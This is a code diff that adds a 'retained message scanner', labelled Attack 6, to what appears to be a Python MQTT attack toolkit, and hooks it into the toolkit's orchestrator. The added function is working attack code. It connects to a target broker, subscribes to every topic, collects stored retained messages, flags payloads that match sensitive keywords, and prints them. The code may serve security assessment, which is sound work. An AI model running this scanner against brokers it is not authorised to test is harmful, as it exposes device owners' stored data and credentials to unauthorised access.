@@ -559,6 +559,150 @@ def harvest_sensitive_data(host, port=1883,
 
 
 # ── Main Orchestrator ─────────────────────────────────────────
+
+def scan_retained_messages(host, port=1883,
+                           username=None, password=None):
+    """
+    Attack 6: Scan for MQTT retained messages.
+
+    Retained messages are stored by the broker permanently
+    and delivered immediately to any new subscriber.
+    Devices may have published sensitive data in the past
+    that is still stored on the broker — even if no device
+    is currently active.
+
+    This attack subscribes to all topics with the retained
+    flag and collects any stored messages immediately.
+
+    Args:
+        host (str): MQTT broker hostname or IP
+        port (int): MQTT broker port
+        username (str): Optional username
+        password (str): Optional password
+
+    Returns:
+        dict: Retained message scan results
+    """
+    print(f"\n[*] Attack 6: Scanning for retained messages "
+          f"on {host}:{port}")
+
+    result = {
+        "attack":            "Retained Message Scanner",
+        "target":            f"{host}:{port}",
+        "retained_messages": [],
+        "sensitive_found":   False,
+        "finding":           "",
+        "severity":          ""
+    }
+
+    retained_messages = []
+    connected = [False]
+    scan_complete = [False]
+
+    def on_connect(client, userdata, flags,
+                   reason_code, properties):
+        if not reason_code.is_failure:
+            connected[0] = True
+            # Subscribe to all topics — retained messages
+            # are delivered immediately on subscription
+            client.subscribe("#", qos=0)
+            print("    [+] Subscribed — collecting "
+                  "retained messages...")
+        else:
+            print(f"    [-] Connection failed: {reason_code}")
+
+    def on_message(client, userdata, message):
+        # Check if this is a retained message
+        if message.retain:
+            payload = ""
+            try:
+                payload = message.payload.decode(
+                    'utf-8', errors='ignore'
+                )
+            except Exception:
+                payload = str(message.payload[:100])
+
+            retained_messages.append({
+                "topic":   message.topic,
+                "payload": payload[:200],
+                "qos":     message.qos,
+                "retain":  True
+            })
+
+            # Check for sensitive patterns
+            sensitive_hit = any(
+                keyword in payload.lower()
+                for keyword in SENSITIVE_PATTERNS
+            )
+
+            if sensitive_hit:
+                result["sensitive_found"] = True
+                print(f"    [!] RETAINED+SENSITIVE: "
+                      f"{message.topic}")
+                print(f"        Payload: {payload[:80]}")
+            else:
+                print(f"    [+] Retained: {message.topic} "
+                      f"({len(payload)} bytes)")
+
+    try:
+        client = mqtt.Client(
+            mqtt.CallbackAPIVersion.VERSION2
+        )
+        client.on_connect = on_connect
+        client.on_message = on_message
+
+        if username:
+            client.username_pw_set(username, password)
+
+        client.connect(host, port, keepalive=10)
+        client.loop_start()
+
+        # Wait for connection
+        timeout = 5
+        start = time.time()
+        while not connected[0] and                 time.time() - start < timeout:
+            time.sleep(0.1)
+
+        if connected[0]:
+            # Wait to collect retained messages
+            # They arrive immediately after subscription
+            time.sleep(3)
+
+        client.loop_stop()
+        client.disconnect()
+
+    except Exception as e:
+        result["finding"]  = f"Scan error: {str(e)}"
+        result["severity"] = "ERROR"
+        return result
+
+    # Store results
+    result["retained_messages"] = retained_messages
+    count = len(retained_messages)
+
+    if count > 0:
+        if result["sensitive_found"]:
+            result["finding"] = (
+                f"Found {count} retained message(s) — "
+                f"sensitive data present in stored messages"
+            )
+            result["severity"] = "CRITICAL"
+            print(f"[!] CRITICAL: {count} retained "
+                  f"message(s) with sensitive data")
+        else:
+            result["finding"] = (
+                f"Found {count} retained message(s) — "
+                f"historical data stored on broker"
+            )
+            result["severity"] = "HIGH"
+            print(f"[!] HIGH: {count} retained message(s) found")
+    else:
+        result["finding"]  = "No retained messages found"
+        result["severity"] = "INFO"
+        print("[-] No retained messages found")
+
+    return result
+
 def run_mqtt_attacks(host, port=1883):
     """
     Run all 5 MQTT attacks against a target broker.
@@ -638,6 +782,11 @@ def run_mqtt_attacks(host, port=1883):
         host, port, username, password
     )
     all_results["attacks"].append(harvest_result)
+    # Attack 6 — Retained message scanner
+    retained_result = scan_retained_messages(
+        host, port, username, password
+    )
+    all_results["attacks"].append(retained_result)
 
     # Tally findings by severity
     for attack in all_results["attacks"]:
